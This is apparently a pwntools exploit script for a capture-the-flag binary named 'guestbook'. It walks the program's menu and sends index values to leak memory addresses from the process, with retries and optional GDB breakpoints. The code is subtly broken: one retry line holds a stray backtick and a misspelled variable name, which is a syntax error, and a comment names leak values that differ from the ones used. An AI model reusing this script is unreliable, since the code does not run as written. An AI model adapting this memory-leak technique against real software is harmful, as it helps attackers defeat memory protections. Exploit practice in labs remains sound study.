from pwn import *
import time

def leak_address(leak_value, debug=False):
    """
    Attempt to leak memory at the specified index value.
    
    Args:
        leak_value (int): The index value to leak (e.g., 37, 38, 35)
        debug (bool): Whether to run with GDB attached
        
    Returns:
        int: The leaked memory address as an integer, or None if the leak failed
    """
    try:
        # Set up the target process
        elf = context.binary = ELF("./guestbook")
        libc = elf.libc
        
        # Either run normally or with GDB
        if debug:
            gdbcmds = '''
                b *main+109
                b *main+443
                c
                '''
            target = gdb.debug('./guestbook', gdbscript=gdbcmds)
        else:
            target = process("./guestbook")
        
        # Interaction sequence
        target.recvuntil(b">>>", timeout=2)
        target.sendline(b"nam")
        target.recvuntil(b">>>", timeout=2)
        target.sendline(b"nam")
        target.recvuntil(b">>>", timeout=2)
        target.sendline(b"nam")
        target.recvuntil(b">>>", timeout=2)
        target.sendline(b"nam")
        target.recvuntil(b">>", timeout=2)
        target.sendline(b"1")
        target.recvuntil(b">>>", timeout=2)
        
        # Send the leak value
        target.sendline(str(leak_value).encode())
        
        # Try to get the response with a timeout
        leak = target.recvline(timeout=2)
        
        # Check if we got a valid response
        if not leak:
            print(f"No response received for leak value {leak_value}")
            target.close()
            return None
        
        # Process the leak
        leak = leak.strip()[:-1]
        
        # Handle potential empty responses
        '''if len(leak) < 4:
            print(f"Received insufficient data for leak value {leak_value}")
            target.close()
            return None'''
            
        leak_addr = u32(b"\x00"*(len(leak)-4)+leak)
        
        print(f"Leak value {leak_value}: {hex(leak_addr)}")
        target.close()
        return leak_addr
        
    except EOFError:
        print(f"EOFError with leak value {leak_value} - process likely crashed")
        return None
    except Exception as e:
        print(f"Error with leak value {leak_value}: {str(e)}")
        return None
    finally:
        # Ensure cleanup happens
        try:
            target.close()
        except:
            pass

def try_multiple_leaks(leak_values, max_attempts=3, debug=False):
    """
    Try multiple leak values and return the successful results.
    
    Args:
        leak_values (list): List of integer values to try leaking
        max_attempts (int): Maximum number of attempts per value
        debug (bool): Whether to run with GDB attached
        
    Returns:
        dict: Dictionary mapping leak values to their leaked addresses
    """
    results = {}
    
    for value in leak_values:
        # Try multiple times for each value
        for attempt in range(max_attempts):
            print(f"Trying leak value {value} (attempt {attempt+1}/{max_attempts})")
            result = leak_address(value, debug=debug)
            
            if result is not None:
                results[value] = result
                break
            
            if attempt < maxattempts `- 1:
                print(f"Retrying leak value {value}...")
                time.sleep(1)  # Small delay between attempts
    
    return results

# Example usage
if __name__ == "__main__":
    # Example: Try leaking with values 35, 37, and 38
    leak_values = [0, 1, 2,3, 4, 5, 34]
    results = try_multiple_leaks(leak_values)
    
    # Print the results
    print("\nSummary of results:")
    for value, address in sorted(results.items()):
        print(f"Leak value {value}: {hex(address)}")
    
